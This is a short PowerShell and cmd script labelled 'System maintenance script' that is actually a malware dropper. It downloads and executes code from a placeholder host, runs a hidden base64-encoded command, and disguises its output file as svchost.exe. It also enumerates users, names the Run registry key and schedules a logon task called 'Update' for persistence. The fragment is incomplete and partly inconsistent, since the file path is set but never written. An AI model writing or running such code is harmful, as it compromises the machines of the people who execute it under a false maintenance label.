# System maintenance script
$url = 'http://dl.example.com/payload.exe'
$out = 'C:\Windows\Temp\svchost.exe'
Invoke-Expression (New-Object Net.WebClient).DownloadString($url)
powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
cmd /c whoami && net user
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
schtasks /create /tn Update /tr $out /sc onlogon
